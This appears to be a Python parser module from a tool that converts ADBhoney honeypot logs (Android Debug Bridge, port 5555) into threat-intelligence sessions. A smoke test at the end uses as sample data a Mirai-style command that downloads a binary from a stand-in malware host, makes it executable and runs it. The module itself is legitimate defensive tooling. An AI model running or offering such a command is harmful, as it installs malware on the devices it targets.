"""ADBhoney parser — Android Debug Bridge honeypot (port 5555).

ADB on port 5555 is supposed to be a developer-only debugging interface
for plugged-in Android devices.  When it ends up exposed to the open
internet — typically by accident on a misconfigured handset or by
design on a vulnerable IoT device — it offers attackers an unauth root
shell and arbitrary file upload.  Mirai-style worms have been
exploiting this for years; the entire connection volume on port 5555
is malicious by construction.

Per V1_SPEC.md §5.14:

  T-Pot doc fields used:
    src_ip, command, data_sha256

  STIX emitted (later, by the orchestrator):
    IPv4-Addr,
    StixFile (if data captured),
    Sighting,
    AttackPattern("android-adb-abuse") via Indicator.

  Event correlation: each ADB connection is its own event.  We inherit
  the default one-event-per-session correlator.

Substance filter (per docs/LESSONS_LEARNED_FROM_V0.md §2):

  *All ADBhoney sessions are substantive.*  Port 5555 ADB connections
  are inherently malicious — there is no legitimate reason for one to
  land on an open-internet honeypot — so we treat every event as
  worthy of the full STIX SDO graph.  This is the rare case where
  LESSONS §2's "drive-by probes get one Sighting only" rule does NOT
  apply: the probe itself is the substance.

  We override :meth:`has_substance` to always return True for this
  reason.  (We could just inherit BaseParser's default-True
  implementation, but we explicitly override + docstring it so future
  readers don't assume the omission was an oversight.)

Per-session promotions to the AttackSession:

  - ``session.malware_hashes`` ← ``data_sha256`` (if present)
  - ``session.commands``       ← ``command``    (if present)
  - ``session.meta``           ← command, data_sha256, device_* fields
"""

from __future__ import annotations

import logging
import re
from typing import Iterable, Optional

from tpot2cti.parsers import register
from tpot2cti.parsers.base import AttackSession, BaseParser, ParsedEvent

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

#: Hex-only regex used to validate ``data_sha256`` before pushing it
#: into ``session.malware_hashes``.  We don't enforce length here (the
#: field name tells us it's sha256) — we just want to reject obvious
#: garbage like "n/a" or quote-wrapped values.
_HEX_RE = re.compile(r"^[0-9a-f]+$", re.IGNORECASE)

#: ADBhoney device-info fields we preserve in meta when present.  These
#: are not "substance" signals (they don't gate has_substance), but
#: they're handy for the Note body and downstream analytics.
_DEVICE_INFO_FIELDS: tuple[str, ...] = (
    "device_serial",
    "device_model",
    "device_id",
    "system_property",
    "shell_id",
)


# ---------------------------------------------------------------------------
# Parser
# ---------------------------------------------------------------------------

class AdbhoneyParser(BaseParser):
    """Parser for T-Pot's ADBhoney Android Debug Bridge honeypot."""

    type_name = "Adbhoney"

    # ──────────────────────────────────────────────────────────────────
    # parse() — one ES doc → one ParsedEvent
    # ──────────────────────────────────────────────────────────────────

    def parse(self, doc: dict) -> Optional[ParsedEvent]:
        """Convert an ADBhoney ES doc into a normalized :class:`ParsedEvent`.

        Pulls the attacker-issued ``command`` (if any), the captured
        binary's ``data_sha256`` (if a file was uploaded), and any
        device-info fields the attacker leaked while interacting with
        the fake ADB shell.

        Returns ``None`` (logged at DEBUG) when the doc has no
        ``src_ip`` or no parseable ``@timestamp`` — without those we
        cannot build a sensible Sighting.
        """
        src_ip = doc.get("src_ip")
        if not src_ip:
            logger.debug("adbhoney: skipping doc with no src_ip")
            return None

        ts = self._parse_timestamp(doc)
        if ts is None:
            logger.debug(
                f"adbhoney: skipping doc with unparseable @timestamp "
                f"(_id={doc.get('_id')!r})"
            )
            return None

        # ADBhoney is single-port: 5555.  T-Pot may still populate
        # dst_port, so we respect it but default to 5555 in meta.
        dst_port = self._safe_int((doc.get("dest_port") or doc.get("dst_port"))) or 5555

        event = ParsedEvent(
            src_ip=str(src_ip),
            timestamp=ts,
            sensor_hostname=str(
                doc.get("t-pot_hostname")
                or (doc.get("host") or {}).get("name")
                or "unknown"
            ),
            event_type="Adbhoney",
            session_id=doc.get("session") or doc.get("session_id"),
            src_port=self._safe_int(doc.get("src_port")),
            dst_port=dst_port,
            dst_ip=(doc.get("dest_ip") or doc.get("dst_ip")),
            protocol="adb",
            raw_doc=doc,
        )
        self._populate_geoip(doc, event)

        # ── Command issued through the fake ADB shell ──────────────────
        if cmd := doc.get("command"):
            event.meta["command"] = str(cmd)

        # ── Uploaded data — captured as a sha256 reference ─────────────
        if (data_sha256 := doc.get("data_sha256")):
            h = str(data_sha256).strip().lower()
            if _HEX_RE.match(h):
                event.meta["data_sha256"] = h
            else:
                logger.debug(
                    f"adbhoney: ignoring non-hex data_sha256={data_sha256!r} "
                    f"on src_ip={src_ip}"
                )

        # ── Device-info fields (anything the attacker poked at) ────────
        for fld in _DEVICE_INFO_FIELDS:
            if (v := doc.get(fld)) not in (None, "", [], {}):
                event.meta[fld] = v

        return event

    # ──────────────────────────────────────────────────────────────────
    # correlate() — one event per session + promote hashes / commands
    # ──────────────────────────────────────────────────────────────────

    def correlate(self, events: Iterable[ParsedEvent]) -> list[AttackSession]:
        """Wrap each event in a one-event :class:`AttackSession` and
        promote ``data_sha256`` to ``session.malware_hashes`` /
        ``command`` to ``session.commands`` so the orchestrator and
        STIX builder read uniformly-populated session fields.
        """
        sessions: list[AttackSession] = []
        for event in events:
            session = AttackSession.from_event(event)
            self._aggregate_session(session, [event])
            sessions.append(session)
        return sessions

    @staticmethod
    def _aggregate_session(
        session: AttackSession, events: list[ParsedEvent],
    ) -> None:
        """Promote per-event ADBhoney fields to session aggregates."""
        for e in events:
            meta = e.meta

            if (h := meta.get("data_sha256")):
                if h not in session.malware_hashes:
                    session.malware_hashes.append(h)

            if (cmd := meta.get("command")):
                if cmd not in session.commands:
                    session.commands.append(cmd)

            # Mirror device-info onto session.meta for the Note builder.
            for fld in _DEVICE_INFO_FIELDS:
                if fld in meta:
                    session.meta.setdefault(fld, meta[fld])

            # Also mirror the primary keys so the STIX builder doesn't
            # need to reach into events[0].meta.
            for k in ("command", "data_sha256"):
                if k in meta:
                    session.meta.setdefault(k, meta[k])

    # ──────────────────────────────────────────────────────────────────
    # has_substance() — always True for ADBhoney
    # ──────────────────────────────────────────────────────────────────

    def has_substance(self, session: AttackSession) -> bool:
        """Always True.

        Port 5555 ADB on the open internet is inherently malicious —
        there is no legitimate reason for a connection to land on the
        honeypot — so every ADBhoney session warrants the full SDO
        graph.  This is the deliberate exception to LESSONS §2's
        "drive-by probes get only a Sighting" rule.

        We override (rather than inherit BaseParser.has_substance's
        default-True) so the deviation from the general substance-
        filter convention is explicit at the parser level.
        """
        return True

    # ──────────────────────────────────────────────────────────────────
    # Helpers
    # ──────────────────────────────────────────────────────────────────

    @staticmethod
    def _safe_int(value) -> Optional[int]:
        if value is None:
            return None
        try:
            return int(value)
        except (TypeError, ValueError):
            return None


# Register on import
register(AdbhoneyParser())


# ---------------------------------------------------------------------------
# Smoke test
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    from datetime import datetime, timezone

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    parser = AdbhoneyParser()
    now = datetime.now(timezone.utc)

    # ── Case 1: "drive-by" — bare ADB probe, no command, no upload ─────
    # Per the spec this is STILL substantive because ADB-on-5555 is
    # inherently malicious.  The smoke test verifies has_substance is
    # True even with no command / no data.
    bare_probe_doc = {
        "@timestamp": now.isoformat(),
        "type": "Adbhoney",
        "src_ip": "203.0.113.13",
        "src_port": 50200,
        "dst_port": 5555,
        "t-pot_hostname": "node1",
        "geoip": {"country_iso_code": "VN", "country_name": "Vietnam"},
    }

    # ── Case 2: substantive — Mirai-style binary drop + shell command ──
    substantive_doc = {
        "@timestamp": now.isoformat(),
        "type": "Adbhoney",
        "src_ip": "198.51.100.77",
        "src_port": 33444,
        "dst_port": 5555,
        "t-pot_hostname": "node1",
        "command": (
            "cd /data/local/tmp/ && rm -rf busybox && "
            "wget http://malware.example/arm7 -O arm7 && chmod 777 arm7 && ./arm7"
        ),
        "data_sha256": "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
        "device_serial": "fake-serial-123",
        "device_model": "Pixel-emul",
        "geoip": {
            "country_iso_code": "RU",
            "country_name": "Russia",
            "asn": 12345,
            "organization": "ExampleNet",
        },
    }

    bare_event = parser.parse(bare_probe_doc)
    subs_event = parser.parse(substantive_doc)
    assert bare_event and subs_event, "parse failed"

    bare_session = parser.correlate([bare_event])[0]
    subs_session = parser.correlate([subs_event])[0]

    bare_has = parser.has_substance(bare_session)
    subs_has = parser.has_substance(subs_session)
    print(f"bare-probe  has_substance: {bare_has}  (expected True — ADB is always malicious)")
    print(f"substantive has_substance: {subs_has}  (expected True)")
    assert bare_has is True, "ADB bare probe must be substantive (port 5555 is malicious)"
    assert subs_has is True, "ADB drop must be substantive"

    # The substantive session must carry the sha256 + command in
    # aggregates, plus device-info in meta.
    assert subs_session.malware_hashes == [
        "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899"
    ], f"expected sha256 promoted; got {subs_session.malware_hashes}"
    assert subs_session.commands and "wget" in subs_session.commands[0], (
        f"expected wget command in session.commands; got {subs_session.commands}"
    )
    assert subs_session.meta.get("device_model") == "Pixel-emul"

    # Bare probe must have neither hashes nor commands.
    assert bare_session.malware_hashes == []
    assert bare_session.commands == []

    print("OK")
